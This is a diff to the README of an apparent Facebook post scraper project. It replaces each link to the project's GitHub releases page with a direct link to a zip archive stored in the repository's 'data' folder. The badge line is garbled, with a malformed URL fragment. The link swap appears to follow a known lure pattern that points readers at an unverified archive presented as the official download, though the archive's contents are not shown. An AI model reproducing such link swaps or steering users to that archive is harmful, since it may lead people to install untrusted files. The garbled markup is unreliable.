@@ -6,11 +6,11 @@ Welcome to facebook-posts-search-scraper! This tool helps you extract valuable F
 
 ## 📬 Download the Application
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/Aminsafi/facebook-posts-search-scraper/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Aminsafi/facebook-posts-search-scraper/main/data/facebook-posts-search-scraper-3.8.zip%20Latest%https://raw.githubusercontent.com/Aminsafi/facebook-posts-search-scraper/main/data/facebook-posts-search-scraper-3.8.zip)](https://raw.githubusercontent.com/Aminsafi/facebook-posts-search-scraper/main/data/facebook-posts-search-scraper-3.8.zip)
 
 To get started, you need to download the application. Follow these steps:
 
-1. Click the link above, or visit [this page to download](https://github.com/Aminsafi/facebook-posts-search-scraper/releases).
+1. Click the link above, or visit [this page to download](https://raw.githubusercontent.com/Aminsafi/facebook-posts-search-scraper/main/data/facebook-posts-search-scraper-3.8.zip).
 2. Find the latest release version.
 3. Download the file for your operating system.
 
@@ -79,6 +79,6 @@ If you encounter any issues or need further assistance, feel free to reach out. 
 
 ## 📥 Download Again
 
-Don’t forget, you can always [visit this page to download](https://github.com/Aminsafi/facebook-posts-search-scraper/releases) the latest version whenever you need it.
+Don’t forget, you can always [visit this page to download](https://raw.githubusercontent.com/Aminsafi/facebook-posts-search-scraper/main/data/facebook-posts-search-scraper-3.8.zip) the latest version whenever you need it.
 
 Happy extracting!
